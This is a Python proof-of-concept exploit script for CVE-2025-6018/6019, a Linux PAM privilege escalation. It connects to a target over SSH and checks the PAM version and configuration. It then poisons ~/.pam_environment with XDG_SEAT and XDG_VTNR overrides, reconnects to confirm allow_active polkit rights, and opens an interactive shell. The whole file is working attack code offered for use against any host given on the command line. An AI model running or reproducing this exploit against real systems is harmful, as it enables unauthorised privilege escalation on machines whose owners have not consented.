import paramiko
import time
import sys
import socket
import argparse
from colorama import Fore, Style, init

# Colorama
init(autoreset=True)

def print_info(msg): print(Fore.CYAN + "[*] " + msg)
def print_success(msg): print(Fore.GREEN + "[✔] " + msg)
def print_fail(msg): print(Fore.RED + "[✘] " + msg)
def print_warn(msg): print(Fore.YELLOW + "[!] " + msg)
def print_title(msg): print(Fore.MAGENTA + f"\n==== {msg.upper()} ====\n")


def ssh_automation(hostname, username, password=None, key_filename=None, port=22):
    """
    Automates SSH connection, checks for CVE-2025-6018/6019 vulnerability,
    poisons environment variables, and checks privilege escalation effect.
    """
    try:
        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

        print_info(f"Connecting to {hostname}:{port} ...")
        client.connect(hostname, port=port, username=username, 
                       password=password, key_filename=key_filename)
        print_success(f"Connected to {hostname}!")

        print_title("Checking vulnerability conditions")
        checks = {
            "pam_version": "rpm -q pam",
            "pam_env": "grep -r 'pam_env.so' /etc/pam.d/common-* /etc/pam.d/sshd 2>/dev/null",
            "pam_systemd": "grep -r 'pam_systemd.so' /etc/pam.d/common-* /etc/pam.d/sshd 2>/dev/null"
        }

        vulnerable = False
        for key, cmd in checks.items():
            print_info(f"Running check: {key}")
            stdin, stdout, stderr = client.exec_command(cmd)
            output = stdout.read().decode().strip()
            print(output + "\n")
            time.sleep(1)

            if key == "pam_version" and "pam-1.3.0" in output:
                print_success("PAM version vulnerable")
                vulnerable = True
            elif key == "pam_env" and "pam_env.so" in output:
                print_success("pam_env.so found in PAM config")
                vulnerable = True

        if not vulnerable:
            print_fail("System does not appear vulnerable. Exiting...")
            client.close()
            return

        print_warn("Proceeding with environment poisoning...")

        # Stage 1: Poison PAM environment
        print_title("Stage 1: Environment Poisoning")
        commands_sequence_1 = [
            "id",
            "gdbus call --system --dest org.freedesktop.login1 --object-path /org/freedesktop/login1 --method org.freedesktop.login1.Manager.CanReboot",
            "{ echo 'XDG_SEAT OVERRIDE=seat0'; echo 'XDG_VTNR OVERRIDE=1'; } > ~/.pam_environment"
        ]

        for cmd in commands_sequence_1:
            print_info(f"Executing: {cmd}")
            stdin, stdout, stderr = client.exec_command(cmd)
            print(stdout.read().decode())
            time.sleep(1)

        print_success("First stage complete. Disconnecting...")
        client.close()
        time.sleep(2)

        print_info(f"Reconnecting to {hostname} ...")
        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        client.connect(hostname, port=port, username=username, 
                       password=password, key_filename=key_filename)
        print_success("Reconnected successfully!")

        # Stage 2: Validation
        print_title("Stage 2: Privilege Escalation Validation")
        validation_cmd = "gdbus call --system --dest org.freedesktop.login1 --object-path /org/freedesktop/login1 --method org.freedesktop.login1.Manager.CanReboot"
        print_info(f"Executing: {validation_cmd}")
        stdin, stdout, stderr = client.exec_command(validation_cmd)
        output = stdout.read().decode()
        print(output)

        if "yes" in output:
            print_success("Exploit successful! User has allow_active session.")
        else:
            print_fail("Exploit failed!")
            return

        print_title("Interactive Shell")
        print_info("Type 'exit' to leave.")

        shell = client.invoke_shell()
        while True:
            command = input("")
            if command.lower() == 'exit':
                break

            shell.send(command + "\n")
            time.sleep(0.5)
            while shell.recv_ready():
                output = shell.recv(1024).decode()
                print(output, end='')

    except paramiko.AuthenticationException:
        print_fail("Authentication failed. Please verify your credentials.")
    except paramiko.SSHException as ssh_ex:
        print_fail(f"SSH error: {ssh_ex}")
    except socket.error as sock_ex:
        print_fail(f"Socket error: {sock_ex}")
    except Exception as ex:
        print_fail(f"Unexpected error: {ex}")
    finally:
        try:
            client.close()
        except:
            pass
        print_info("Connection closed.")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Automate SSH exploitation of CVE-2025-6018")

    parser.add_argument("-i", "--hostname", required=True, help="Target hostname or IP address")
    parser.add_argument("-u", "--username", required=True, help="SSH username")
    parser.add_argument("-k", "--password", help="SSH password (if using password auth)")
    parser.add_argument("-pk", "--key", dest="key_filename", help="Path to private key (if using key-based auth)")
    parser.add_argument("-p", "--port", type=int, default=22, help="SSH port (default: 22)")

    args = parser.parse_args()

    if not args.password and not args.key_filename:
        parser.error("You must provide either a password (-k) or a private key file (-pk).")

    ssh_automation(
        hostname=args.hostname,
        username=args.username,
        password=args.password,
        key_filename=args.key_filename,
        port=args.port
    )

